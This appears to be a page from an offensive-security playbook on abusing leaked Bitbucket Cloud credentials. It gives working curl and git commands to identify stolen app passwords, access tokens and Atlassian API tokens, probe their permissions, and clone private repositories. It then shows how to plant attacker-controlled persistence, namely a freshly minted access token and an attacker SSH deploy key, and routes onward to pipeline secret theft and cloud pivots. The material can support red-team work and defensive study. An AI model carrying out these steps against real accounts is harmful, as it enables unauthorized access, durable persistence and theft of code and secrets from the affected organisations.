---
title: "Token and app-password abuse"
description: "Identifying and reusing leaked Bitbucket Cloud credentials: app passwords, repository/project/workspace access tokens, Atlassian API tokens, and OAuth consumers, reading their identity and scope through the 2.0 API, cloning and pushing over git, and acting within the granted permissions."
keywords:
  - Bitbucket app password
  - access token
  - Atlassian API token
  - credential reuse
  - OAuth consumer
---

# Token and app-password abuse

Bitbucket Cloud hands out several kinds of credential, and a leaked one is often the whole engagement. They differ in how you authenticate and in what identity and scope they carry, so the first job with any captured string is to classify it, then read its identity and permissions, then act inside them. All of this runs against `https://api.bitbucket.org/2.0` and `git` over HTTPS.

## Credential shapes and fingerprint

Classify by prefix and by which auth scheme the API accepts.

| Credential | Auth scheme | Typical shape | Identity |
| --- | --- | --- | --- |
| App password | Basic `username:app_password` | often `ATBB...` | the user who created it |
| Repository / project / workspace access token | Bearer | often `ATCTT...` | the resource, no user |
| Atlassian API token | Basic `email:api_token` | often `ATATT...` | the Atlassian account |
| OAuth 2.0 access token | Bearer | opaque | the authorizing user |

```bash
# App password or Atlassian API token: Basic auth, identity via /2.0/user
curl -s -u "$BB_USER:$BB_SECRET" https://api.bitbucket.org/2.0/user | jq '{username,account_id,nickname}'

# Access token or OAuth token: Bearer auth
curl -s -H "Authorization: Bearer $BB_SECRET" https://api.bitbucket.org/2.0/user
```

Interpret the responses. A `200` from the Basic-auth `/2.0/user` call means an app password (username is the account username) or an Atlassian API token (username is the email); try both usernames to tell them apart. A Bearer token that `401`s on `/2.0/user` but succeeds on a repository endpoint is a **repository access token**, which has no user identity and is bound to exactly one repository. That binding is the key fact: it tells you the blast radius without further guessing.

## Reading the scope you hold

An app password is restricted to the scopes its creator ticked (account, repository read/write/admin, pipelines, webhooks, and so on). You cannot list the scopes directly, so you probe: each endpoint either returns data or `403`s, and the pattern maps the grant.

```bash
AUTH=(-u "$BB_USER:$BB_APP_PASSWORD")

# repository read
curl -s -o /dev/null -w '%{http_code} repos-read\n' "${AUTH[@]}" \
  https://api.bitbucket.org/2.0/repositories/ACME?pagelen=1
# account read
curl -s -o /dev/null -w '%{http_code} account\n' "${AUTH[@]}" \
  https://api.bitbucket.org/2.0/user
# pipelines (can it trigger builds)
curl -s -o /dev/null -w '%{http_code} pipelines\n' "${AUTH[@]}" \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/pipelines_config
# admin (can it add tokens, keys, webhooks for persistence)
curl -s -o /dev/null -w '%{http_code} admin\n' "${AUTH[@]}" \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/deploy-keys
```

A `200` on `deploy-keys` means repository admin, which is the strongest position: you can plant an SSH deploy key or a new access token for durable access. A `200` on `pipelines_config` plus repository write is the handoff to [Pipelines abuse](pipelines-abuse.md).

## Acting within the grant

Enumerate and then act. With repository read, clone everything the credential reaches and mine it as in [Reconnaissance](reconnaissance.md).

```bash
# Clone with an app password embedded
git clone https://$BB_USER:$BB_APP_PASSWORD@bitbucket.org/ACME/payments-api.git

# Clone with an access token: the username is the literal x-token-auth
git clone https://x-token-auth:$BB_TOKEN@bitbucket.org/ACME/payments-api.git
```

With repository write, you can push a branch, which is enough to trigger a pipeline and reach its secrets. With admin, mint persistence that outlives the leaked credential:

```bash
# Create a repository access token scoped to full repo + pipelines control (requires admin)
curl -s "${AUTH[@]}" -X PUT \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/access-tokens \
  -H 'Content-Type: application/json' \
  -d '{"name":"ci-maintenance","scopes":["repository:write","pipeline:write"]}' \
  | jq -r '.token'

# Or add an SSH deploy key you hold the private half of
curl -s "${AUTH[@]}" -X POST \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/deploy-keys \
  -H 'Content-Type: application/json' \
  -d '{"label":"backup","key":"ssh-ed25519 AAAA... attacker"}'
```

The returned access token is a fresh `ATCTT...` credential that keeps working even after the original app password is rotated, because it is a separate principal.

## Variants and follow-on

- **App password across the whole account**: unlike an access token, an app password is bound to the **user**, so it reaches every workspace and repository that user can, not just one repo. A single leaked app password from a developer with multi-workspace access is far broader than a repository token.
- **Atlassian API token reach**: an Atlassian API token authenticates the account against Bitbucket and other Atlassian Cloud products on the same account (Jira, Confluence), widening the pivot beyond the forge.
- **OAuth consumer secrets**: a leaked OAuth consumer key and secret let you mint tokens on demand through the client-credentials or authorization-code flow, which is persistence at the application level rather than a single token.
- **Follow-on**: a write-capable credential routes to [Pipelines abuse](pipelines-abuse.md) for secret exfiltration and cloud pivots; any cloud key found through that path routes to [AWS](../../cloud/aws/index.md).

## Notes

- Access tokens never have a user identity; stop trying `/2.0/user` with them and probe resource endpoints to find the one repository, project, or workspace they bind to.
- App password username is the **account username**, not the email; Atlassian API token username **is** the email. A `401` is often just the wrong username, not a dead credential, so try both before discarding a secret.
- Scope probing with `-o /dev/null -w '%{http_code}'` is read-only and fast; map the grant before taking any write action so you do not trip on a `403` mid-operation.
- On Bitbucket Data Center/Server the equivalent is an HTTP access token presented as `Authorization: Bearer` against `/rest/api/1.0/`; app passwords and the 2.0 scopes model do not exist there.

## Tools

- **curl** / **jq**: classify credentials, probe scope, and drive the 2.0 API.
- **git**: clone and push with the credential embedded in the URL.
- **TruffleHog** / **Gitleaks**: recover these credentials in the first place from code and history.

## References

- [Bitbucket Cloud: app passwords](https://support.atlassian.com/bitbucket-cloud/docs/create-an-app-password/)
- [Bitbucket Cloud: repository, project, and workspace access tokens](https://support.atlassian.com/bitbucket-cloud/docs/using-access-tokens/)
- [Atlassian: manage API tokens for your account](https://support.atlassian.com/atlassian-account/docs/manage-api-tokens-for-your-atlassian-account/)
- [Bitbucket Cloud REST API: authentication](https://developer.atlassian.com/cloud/bitbucket/rest/intro/#authentication)
- [Bitbucket Cloud REST API: repository access tokens](https://developer.atlassian.com/cloud/bitbucket/rest/api-group-repository-access-tokens/)
